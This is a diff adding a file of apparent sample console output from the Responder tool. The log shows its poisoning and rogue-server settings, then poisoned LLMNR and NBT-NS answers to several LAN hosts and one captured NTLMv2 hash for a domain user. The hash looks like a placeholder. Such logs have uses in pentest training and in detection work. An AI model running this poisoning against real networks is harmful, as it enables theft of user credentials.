@@ -1,0 +1,85 @@
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR & MDNS Responder 3.1.3.0
+
+  To support this project:
+  Patreon -> https://www.patreon.com/PythonResponder
+  Paypal  -> https://paypal.me/PythonResponder
+
+  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+  To kill this script hit CTRL-C
+
+
+[+] Poisoners:
+    LLMNR                      [ON]
+    NBT-NS                     [ON]
+    MDNS                       [ON]
+    DNS                        [ON]
+    DHCP                       [OFF]
+
+[+] Servers:
+    HTTP server                [ON]
+    HTTPS server               [ON]
+    WPAD proxy                 [OFF]
+    Auth proxy                 [OFF]
+    SMB server                 [ON]
+    Kerberos server            [ON]
+    SQL server                 [ON]
+    FTP server                 [ON]
+    IMAP server                [ON]
+    POP3 server                [ON]
+    SMTP server                [ON]
+    DNS server                 [ON]
+    LDAP server                [ON]
+    RDP server                 [ON]
+    DCE-RPC server             [ON]
+    WinRM server               [ON]
+
+[+] HTTP Options:
+    Always serving EXE         [OFF]
+    Serving EXE                [OFF]
+    Serving HTML               [OFF]
+    Upstream Proxy             [OFF]
+
+[+] Poisoning Options:
+    Analyze Mode               [OFF]
+    Force WPAD auth            [OFF]
+    Force Basic Auth           [OFF]
+    Force LM downgrade         [OFF]
+    Force ESS downgrade        [OFF]
+
+[+] Generic Options:
+    Responder NIC              [eth0]
+    Responder IP               [192.168.1.100]
+    Responder IPv6             [fe80::250:56ff:feb4:7890]
+    Challenge set              [random]
+    Don't Respond To Names     ['ISATAP']
+
+[+] Current Session Variables:
+    Responder Machine Name     [WIN-ABCD1234567]
+    Responder Domain Name      [WORKGROUP]
+    Responder DCE-RPC Port     [47765]
+
+[+] Listening for events...
+
+[*] [LLMNR]  Poisoned answer sent to 192.168.1.55 for name filesrv01
+[*] [LLMNR]  Poisoned answer sent to 192.168.1.55 for name filesrv01
+[SMB] NTLMv2-SSP Client   : 192.168.1.55
+[SMB] NTLMv2-SSP Username : CORP\jsmith
+[SMB] NTLMv2-SSP Hash     : jsmith::CORP:1122334455667788:C0FF33C0FF33C0FF33C0FF33C0FF33C0FF:0101000000000000C0653150DE09D201FFFFFFFFFFFFFFFFFFFFFFFFFFFFF
+[*] [LLMNR]  Poisoned answer sent to 192.168.1.30 for name intranet
+[*] [LLMNR]  Poisoned answer sent to 192.168.1.30 for name intranet
+[*] [NBT-NS] Poisoned answer sent to 192.168.1.45 for name PRINTSERVER (service: File Server)
+[*] [NBT-NS] Poisoned answer sent to 192.168.1.45 for name PRINTSERVER (service: File Server)
+[*] [LLMNR]  Poisoned answer sent to 192.168.1.65 for name backup
+[*] [LLMNR]  Poisoned answer sent to 192.168.1.65 for name backup
+[*] [LLMNR]  Poisoned answer sent to 192.168.1.80 for name mail
+[*] [LLMNR]  Poisoned answer sent to 192.168.1.80 for name mail
+[*] [NBT-NS] Poisoned answer sent to 192.168.1.95 for name SQL01 (service: File Server)
+[*] [NBT-NS] Poisoned answer sent to 192.168.1.95 for name SQL01 (service: File Server)
+
+[+] Exiting...
